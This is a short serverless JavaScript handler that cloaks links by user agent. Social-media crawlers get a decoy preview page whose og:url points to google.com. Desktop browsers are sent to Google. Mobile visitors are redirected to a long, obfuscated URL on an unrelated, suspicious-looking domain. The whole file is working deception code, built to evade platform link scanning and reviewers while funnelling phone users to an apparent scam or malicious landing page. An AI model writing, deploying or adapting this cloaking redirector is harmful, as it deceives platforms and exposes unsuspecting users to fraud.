export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😍🎧🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Sun-Sep-13-2026/cc4a4e6a-9095-49be-af23-ae042716cd7d/6215a769-73f7-4a3d-b40c-db58edf42455.avif">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/ekiXCi/L-SpYgpl/DpQxEhvgQRrC3EZ/OjCObreYhCbWeJwd/Cgr3591/jJlnOUNRzijLflZ/htsnVw9/6Ar/Peo9g8i_r8hsEfgxN8/ECOqf0mMjf40n/a8mC/YeOp2CxFRFDk4l/Cwg2w", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
